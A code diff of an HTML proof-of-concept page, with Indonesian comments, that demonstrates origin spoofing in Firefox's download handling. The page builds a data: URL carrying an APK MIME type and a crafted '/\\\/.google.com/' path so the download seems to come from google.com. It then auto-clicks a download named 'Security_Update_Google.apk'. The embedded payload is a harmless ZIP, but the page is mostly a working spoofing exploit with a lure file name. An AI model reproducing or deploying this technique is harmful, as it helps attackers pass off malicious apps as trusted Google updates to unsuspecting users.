@@ -3,47 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Firefox Origin Spoofing + APK Fix</title>
+    <title>Firefox Origin Spoofing + APK Fix PoC</title>
     <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding: 50px; }
-        .card { background: #2d2d2d; border-radius: 12px; padding: 30px; border: 1px solid #444; display: inline-block; }
-        button { 
-            background: #ff5252; color: white; padding: 15px 30px; border: none; 
-            border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px;
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
+        .card { background: #1e1e1e; border-radius: 12px; padding: 30px; margin: 20px auto; max-width: 500px; border: 1px solid #333; box-shadow: 0 8px 20px rgba(0,0,0,0.5); }
+        h2 { color: #00e676; margin-bottom: 10px; }
+        p { color: #bbb; margin-bottom: 25px; }
+        .btn-trigger { 
+            background: #ffffff; color: #000; width: 100%; padding: 15px; 
+            border: none; border-radius: 8px; font-weight: bold; cursor: pointer; 
+            transition: 0.2s; font-size: 16px;
         }
-        #log { margin-top: 20px; color: #00e676; font-family: monospace; }
+        .btn-trigger:hover { background: #e0e0e0; transform: scale(1.02); }
+        #log { 
+            font-family: monospace; background: #000; color: #00e676; 
+            padding: 15px; border-radius: 8px; margin-top: 20px; text-align: left; 
+            font-size: 12px; border: 1px solid #444; overflow-x: auto;
+        }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>Firefox Security Research</h2>
-        <p>Testing Authority Injection with APK Payload</p>
-        <button onclick="runSpoof()">Trigger Spoofed Download</button>
-        <div id="log">Status: Ready</div>
+        <h2>Firefox Master PoC</h2>
+        <p>Testing Origin Spoofing with Persistent .apk Extension</p>
+        
+        <button class="btn-trigger" onclick="runFirefoxSpoof()">Run Authority Injection</button>
+
+        <div id="log">Status: Awaiting action...</div>
     </div>
 
     <script>
-        function runSpoof() {
-            const log = document.getElementById('log');
-            log.innerText = "Status: Triggering...";
+        const logger = document.getElementById('log');
+        const updateLog = (msg) => {
+            const time = new Date().toLocaleTimeString();
+            logger.innerText += `\n[${time}] ${msg}`;
+        };
 
-            // Payload APK minimalis (Magic Bytes PK..) agar Firefox tidak mengubah ke .txt
-            const apkBase64 = "UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAACQAAAGhlbGxvLnR4dFV0RAsAA2SjdWZko3VmdXgLAAEE6AMAAAToAwAAUEsBAhQDFAAAAAgAAAAAAAAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAaGVsbG8udHh0VXRFAANZp3VmdKd1ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAEUAAABZAAAAAAA=";
+        function runFirefoxSpoof() {
+            updateLog("Initializing payload...");
 
-            // Menggunakan teknik Authority Injection yang kamu temukan
-            // Struktur: data:[MIME];base64,[DATA]/\\//google.com/
-            const spoofedURL = "data:application/vnd.android.package-archive;base64," + apkBase64 + "/\\\\\\/.google.com/application/x-msdownload";
+            /* 1. Payload APK Valid (Magic Bytes: PK..)
+               Ini adalah Base64 dari file ZIP minimal. 
+               Tanpa ini, Firefox Android akan memaksa ekstensi menjadi .txt
+            */
+            const apkPayload = "UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAACQAAAGhlbGxvLnR4dFV0RAsAA2SjdWZko3VmdXgLAAEE6AMAAAToAwAAUEsBAhQDFAAAAAgAAAAAAAAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAaGVsbG8udHh0VXRFAANZp3VmdKd1ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAEUAAABZAAAAAAA=";
 
-            const a = document.createElement("a");
-            a.href = spoofedURL;
-            a.download = "system_patch.apk";
+            /* 2. Struktur URL 'Double-MIME'
+               Format: data:[MIME_ASLI];[SPOOFING_PATH];base64,[DATA]
+               - Browser membaca 'application/vnd.android.package-archive' -> File dianggap APK.
+               - UI Parser Firefox diharapkan mengambil '/\\\\\\/.google.com/' sebagai origin.
+            */
+            const mimeType = "application/vnd.android.package-archive";
+            const spoof = "/\\\\\\/.google.com/application/x-msdownload";
             
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+            const finalURL = `data:${mimeType};${spoof};base64,${apkPayload}`;
 
-            log.innerText = "Status: Download triggered! Check extension and origin.";
+            setTimeout(() => {
+                const a = document.createElement("a");
+                a.href = finalURL;
+                a.download = "Security_Update_Google.apk";
+                
+                // Append ke body penting agar browser memproses event dengan benar
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+
+                updateLog("Download triggered!");
+                updateLog("Check if Origin is 'google.com' and Extension is '.apk'");
+            }, 500);
         }
     </script>
 </body>
